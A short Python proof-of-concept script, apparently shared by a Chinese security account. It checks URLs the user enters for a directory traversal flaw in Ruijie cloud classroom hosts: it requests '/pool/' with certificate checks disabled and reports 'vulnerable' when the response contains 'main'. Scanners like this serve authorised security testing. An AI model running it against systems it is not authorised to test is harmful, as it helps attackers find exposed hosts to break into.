import requests
import urllib3
urllib3.disable_warnings()

def poc():
    print('+---------------------------------------------------+')
    print('+ \033[1;36m锐捷云课堂主机 目录遍历漏洞\033[0m                       +')
    print('+ \033[1;36m公众号：bgbing安全\033[0m                                +')
    print('+ \033[1;36m作者：黑子黑\033[0m                                      +')
    print('+ \033[1;36murl >>>http://xxx.xxx.xxx.xxx\033[0m                     +')
    print('+---------------------------------------------------+')
poc()
while 1:
    url=input("\033[1;36murl >>>\033[0m")
    url=url+"/pool/"
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        }
    response=requests.get(url,headers=header,verify=False)
    if 'main' in response.text:
        print("\033[1;36m存在漏洞\033[0m")
    else:
        print("\033[1;31m不存在漏洞\033[0m")
